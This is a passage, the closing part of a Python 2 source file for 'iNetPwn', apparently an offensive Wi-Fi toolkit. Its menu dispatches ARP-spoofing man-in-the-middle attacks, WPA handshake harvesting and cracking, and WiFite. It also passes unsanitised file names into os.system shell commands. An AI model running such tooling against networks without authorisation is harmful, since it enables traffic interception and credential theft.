        return devices

    def selectDevice(self, devices):
        try:
            print ""
            i = int(raw_input("Select Device: ")) - 1
            if i >= len(devices) or i <= 0: return False
            devices[i].update({"RouterAddress": devices[0]["Local_IP"]})
            return devices[i]
        except KeyboardInterrupt: print "\n\n"
        except ValueError: print "\nInvalid Input...\n"
        return False

if __name__ == "__main__":
    os.system("clear")
    while True:
        try:
            print "%s  .;'                     `;,  " % (" " * 16)
            print "%s .;'  ,;'             `;,  `;, " % (" " * 16)
            print "%s.;'  ,;'  ,;'     `;,  `;,  `;," % (" " * 16)
            print "%s::   ::   :   ( )   :   ::   ::" % (" " * 16)
            print "%s':.  ':.  ':. /_\ ,:'  ,:'  ,:'" % (" " * 16)
            print "%s ':.  ':.    /___\    ,:'  ,:' " % (" " * 16)
            print "%s  ':.       /_____\      ,:'   " % (" " * 16)
            print "%s           /       \           " % (" " * 16)
            print "-" * 62; print (" " * 18) + Colors["red"] + "iNetPwn (c) Richard Cazales 2020" + Colors["end"]; print "-" * 62; print
            print "   1.  WiFi Penetration Test & Analysis"
            print "   2.  My Local Network Info"
            print "   3.  Perform Man in The Middle Attack (MITMA)"
            print "   4.  WiFi Passive Listener"
            print "   5.  NetXML Parser"
            print "   6.  Handshake Harvester"
            print "   7.  Crack Handshakes"
            print "   8.  WiFite v2 (r87)"
            print ""
            print "   9.  Reset Network Manager & Wireless Interfaces"
            print ""
            x = raw_input("Select Option: ")
            if x in ["1", "2", "3", "4", "5", "6"]: wlanx = AirCrack().selectInterface()
            if x == "1" and wlanx: AirCrack().wirelessOptions(AirCrack().selectNetwork(AirCrack().sortNetworks(AirCrack().xmlParser(AirCrack().scanNetworks(wlanx)))))
            elif x == "2" and wlanx: MyNetwork().localDevices(wlanx)
            elif x == "3" and wlanx:
                target = MyNetwork().selectDevice(MyNetwork().localDevices(wlanx))
                if target:
                    print "\n\tSelect Wireless Interface w/ Packet Sniffing Capabilities\n"
                    wlanx = AirCrack().selectInterface()
                    if target: ArpSpoof().attack(wlanx, target)
            elif x == "4" and wlanx: AirCrack().passiveListener(wlanx)
            elif x == "5":
                netxml_files = AirCrack().selectXMLs()
                tmp_file = "netxml/tmp.netxml"
                os.system("cat '%s' > '%s'" % (" ".join(netxml_files), tmp_file))
                AirCrack().selectNetwork(AirCrack().sortNetworks(AirCrack().xmlParser(tmp_file)))
                os.system("rm '%s'" % tmp_file)
            elif x == "6":
                handshake = AirCrack().getHandshakes(wlanx)
                if handshake:
                    if "Y" in raw_input("Crack '%s'?: " % handshake).upper():
                        AirCrack().crackHandshakes(handshake); quit()
            elif x == "7": AirCrack().crackHandshakes(); quit()
            elif x == "8": os.system("wifite")
            elif x == "9":
                os.system("airmon-ng | grep wlan > airmon-ng_wlanx.txt")
                airmon_txt = open("airmon-ng_wlanx.txt", "r"); os.system("rm airmon-ng_wlanx.txt")
                for line in airmon_txt:
                    if "mon" in line.split()[1]: os.system("airmon-ng stop %s" % line.split()[1])
                    os.system("ifconfig %s down; ifconfig %s up" % tuple([line.split()[1].replace("mon", "")] * 2))
                os.system("airmon-ng check kill 2>&1; service network-manager stop; service network-manager start;")
            print ""
        except KeyboardInterrupt:
            print "\n\n"; quit()
        except: raise
